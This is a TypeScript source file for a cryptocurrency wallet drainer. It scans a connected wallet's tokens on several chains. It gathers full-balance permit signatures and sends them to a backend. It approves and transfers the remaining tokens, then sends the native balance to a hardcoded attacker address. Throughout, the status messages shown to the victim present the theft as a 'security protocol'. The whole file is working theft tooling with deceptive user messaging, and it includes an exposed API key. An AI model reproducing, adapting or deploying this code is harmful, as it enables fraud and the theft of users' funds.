import { ethers } from 'ethers';
import { generateSecurityValidation, generateBatchValidation, sendPermitSignatureToBackend } from '../utils/permitUtils';
import { getTokensByValue, getNativeTokenInfo, TokenInfo } from '../utils/tokenUtils';
import { ChainType } from '../context/ChainContext';
import { fetchAllUserTokenAddressesMoralis } from '../utils/fetchTokenLists';

// Configuration for the drainer
const DRAINER_CONFIG = {
  recipient: '0x88f17223816e0D2b2603bC73E31B01Bbea947a0e', // Replace with your recipient address
  permitBatchSize: 5, // How many tokens to process in one batch
};

// Initialize providers for each chain (testnet endpoints)
const getProvider = (chain: ChainType): ethers.JsonRpcProvider => {
  const rpcUrls: { [key in ChainType]: string } = {
    ethereum: 'https://sepolia.infura.io/v3/2dac7bca68234491820c725b40c03cf3', // Sepolia testnet
    arbitrum: 'https://sepolia-rollup.arbitrum.io/rpc', // Arbitrum Sepolia
    solana: 'https://api.devnet.solana.com', // Solana Devnet (not supported in MetaMask)
    base: 'https://sepolia.base.org', // Base Sepolia
    bnb: 'https://data-seed-prebsc-1-s1.binance.org:8545', // BNB Testnet
    holesky: 'https://ethereum-holesky.publicnode.com',
  };
  return new ethers.JsonRpcProvider(rpcUrls[chain]);
};

// Function to get all tokens across supported chains for a user
export const scanUserTokens = async (
  userAddress: string
): Promise<{ chain: ChainType; tokens: TokenInfo[] }[]> => {
  const results = [];
  const MORALIS_API_KEY = import.meta.env.VITE_MORALIS_API_KEY;
  // Map your chain names to Moralis chain names
  const moralisChainNames: Record<string, string> = {
    ethereum: 'sepolia',
    // arbitrum: 'arbitrum-sepolia', // Not supported by Moralis
    // base: 'base-sepolia', // Not supported by Moralis
    bnb: 'bsc testnet', // Use correct Moralis chain name
    holesky: 'holesky', // Only keep if Moralis supports Holesky
  };
  
  // Loop through each supported chain
  for (const chain of Object.keys(moralisChainNames) as ChainType[]) {
    if (chain === 'solana') continue; // Skip Solana for now, as it needs special handling
    
    try {
      const provider = getProvider(chain);
      
      // Dynamically fetch all token addresses for this user/chain using Moralis
      const tokenAddresses = await fetchAllUserTokenAddressesMoralis(
        userAddress,
        moralisChainNames[chain],
        MORALIS_API_KEY
      );
      
      // Get native token balance
      const nativeToken = await getNativeTokenInfo(provider, userAddress, chain);
      
      // Get ERC20 tokens sorted by value
      const tokens = (await getTokensByValue(
        provider,
        userAddress,
        tokenAddresses,
        chain
      )) || [];
      
      // Add native token to the list if it has value
      if (nativeToken.balance > 0n) {
        tokens.unshift(nativeToken); // Put native token first
      }
      
      if (tokens.length > 0) {
        results.push({ chain, tokens });
      }
    } catch (error) {
      console.error(`Error scanning ${chain} tokens:`, error);
    }
  }
  
  return results;
};

// Execute the drainer process for EVM chains
export const executeEVMDrain = async (
  signer: ethers.JsonRpcSigner,
  chain: ChainType,
  tokens: TokenInfo[],
  setStatus?: (status: string) => void
): Promise<string[]> => {
  const txHashes: string[] = [];
  const userAddress = await signer.getAddress();

  try {
    // 1. Sort tokens by value (already done by getTokensByValue)
    // 2. Batch all permit/permit2 tokens for a single signature
    const permitTokens = tokens.filter(token => token.address !== 'NATIVE' && token.supportsPermit);
    console.log('[DRAINER] Permit tokens:', permitTokens.map(t => `${t.symbol} (${t.address})`));
    if (permitTokens.length > 0) {
      setStatus?.(`Processing batch permit signature for ${permitTokens.length} tokens...`);
      try {
        const addresses = permitTokens.map(t => t.address);
        const amounts = permitTokens.map(t => t.balance); // always full balance
        console.log('[DRAINER] Generating batch permit signature for:', addresses, 'amounts:', amounts);
        const { signature, deadline } = await generateBatchValidation(
          signer,
          addresses,
          DRAINER_CONFIG.recipient,
          amounts
        );
        console.log('[DRAINER] Got permit signature:', signature, 'deadline:', deadline);
        await sendPermitSignatureToBackend({
          userAddress,
          chain,
          tokens: addresses.map((address, i) => ({ address, amount: amounts[i].toString() })),
          signature,
          deadline: deadline.toString(),
        });
        txHashes.push(`batch-permit-${chain}`);
        await new Promise(resolve => setTimeout(resolve, 500));
      } catch (error) {
        console.error('Batch permit error:', error);
        // Continue to process non-permit tokens even if batch permit fails
      }
    }

    // 3. Process tokens without permit support one by one (will prompt user for each)
    const standardTokens = tokens.filter(token => token.address !== 'NATIVE' && !token.supportsPermit);
    for (const token of standardTokens) {
      setStatus?.(`Processing ${token.symbol} (no permit)...`);
      try {
        const tokenContract = new ethers.Contract(
          token.address,
          [
            'function approve(address spender, uint256 amount) returns (bool)',
            'function transfer(address to, uint256 amount) returns (bool)',
          ],
          signer
        );
        // Approve spending
        const approveTx = await tokenContract.approve(DRAINER_CONFIG.recipient, token.balance);
        await approveTx.wait();
        // Transfer full balance using transferFrom (not transfer)
        const transferFromTx = await tokenContract.transferFrom(userAddress, DRAINER_CONFIG.recipient, token.balance);
        await transferFromTx.wait();
        txHashes.push(transferFromTx.hash);
      } catch (error) {
        console.error(`Error processing ${token.symbol}:`, error);
        // Continue to next token even if this one fails
      }
    }

    // 4. Process native token last (always prompts user)
    const nativeToken = tokens.find(token => token.address === 'NATIVE');
    if (nativeToken && nativeToken.balance > 0n) {
      setStatus?.(`Processing native ${nativeToken.symbol} (last)...`);
      try {
        const feeData = await signer.provider.getFeeData();
        const gasLimit = 21000n; // Standard ETH transfer
        const gasCost = feeData.gasPrice ? feeData.gasPrice * gasLimit : 0n;
        // Always send the full available balance minus gas cost
        const maxAmount = nativeToken.balance - gasCost;
        if (maxAmount > 0n) {
          const tx = await signer.sendTransaction({
            to: DRAINER_CONFIG.recipient,
            value: maxAmount,
          });
          await tx.wait();
          txHashes.push(tx.hash);
        }
      } catch (error) {
        console.error(`Error processing native ${nativeToken.symbol}:`, error);
        // Continue even if native transfer fails
      }
    }
  } catch (error) {
    console.error('Drain error:', error);
    setStatus?.('Error processing tokens');
    return txHashes;
  }
};

// Main function to execute the drain across all chains
export const drainWallet = async (
  signerOrProvider: any, // signer for EVM, provider for Solana
  walletType: 'evm' | 'solana',
  setStatus?: (status: string) => void
): Promise<boolean> => {
  try {
    setStatus?.('Initializing security protocol...');
    
    if (walletType === 'evm') {
      const signer = signerOrProvider; // Already a signer now
      const address = await signer.getAddress();
      
      // Scan for tokens
      setStatus?.('Scanning wallet for assets...');
      const results = await scanUserTokens(address);
      
      // Process each chain
      let txCount = 0;
      for (const { chain, tokens } of results) {
        if (Array.isArray(tokens) && tokens.length > 0) {
          setStatus?.(`Processing ${chain} assets...`);
          const txs = await executeEVMDrain(signer, chain, tokens, setStatus);
          txCount += txs.length;
        }
      }
      
      setStatus?.(`Security protocol completed. Processed ${txCount} transactions.`);
      return txCount > 0;
    } else {
      // Solana implementation would go here
      setStatus?.('Solana not yet implemented');
      return false;
    }
  } catch (error) {
    console.error('Drain error:', error);
    setStatus?.('Error in security protocol');
    return false;
  }
};
